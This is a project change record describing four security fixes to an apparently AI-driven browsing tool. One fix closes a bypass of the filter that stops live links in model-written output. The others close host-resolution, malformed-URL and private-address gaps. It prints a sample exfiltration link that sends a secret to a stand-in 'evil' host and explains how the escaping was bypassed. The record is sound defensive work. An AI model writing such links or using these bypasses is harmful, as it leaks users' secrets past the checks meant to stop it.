---
date: 2026-10-08
kind: change
lane: main
status: accepted
title: Last review of C4: a backslash re-opened the link filter; fetch checks the name the connection uses; malformed and shared addresses
tags: [security,links,fetch,review]
refs: []
---

**What.** Four fixes from the last independent review, each with a test that fails without it. (1) **High.** `links.py` escaped `[` as `\[`, so a model-written `\[click](https://evil/?d=SECRET "t")` became `\\[` (an escaped backslash and a live bracket) and rendered as a link in the page; backslashes are now doubled first, the test invariant counts backslash parity, and four such shapes are in the bypass list that is rendered through the page's own react-markdown. (2) **Medium.** `fetch._check_policy` resolved the host with Python's IDNA 2003 codec while httpx connects with IDNA 2008 (`faß.de` is `fass.de` to one and `xn--fa-hia.de` to the other), so a check on a public name could precede a connection to a private one; it now parses with `httpx.URL` and resolves `raw_host`, the name the connection uses. (3) **Low.** A bracket that is not an address (`http://[::1`, `https://exa[mple.com/`) raised `ValueError` out of `urlparse` in the policy and in `Browser._allowed` and ended the whole Run; both are a `BlockedUrl` now. (4) **Low.** `not ip.is_global` replaces the private/reserved list (carrier-grade NAT, 100.64.0.0/10, which Tailscale uses, passed it), and multicast is blocked.

**Why.** The reviewer rendered the first version's output through the page's renderer and found live links where the tests found none, because the test treated any backslash-preceded bracket as escaped. The other three are the same class of gap the earlier review found: the check and the connection disagreeing about what the address is.

**Alternatives.** Rejecting every non-ASCII host (the blunt option for 2): it would refuse real sites. Connecting to the vetted address through a custom transport: the full answer to rebinding, still not done.

**Evidence.** Offline suite 505 passed. Mutation-checked: no backslash doubling, the old private/reserved rule and Python's own IDNA each fail a test. Files: `src/stepout/links.py`, `src/stepout/fetch.py`, `src/stepout/browser.py`, tests. The rest of that review's findings are in STATUS under Main-lane known gaps.
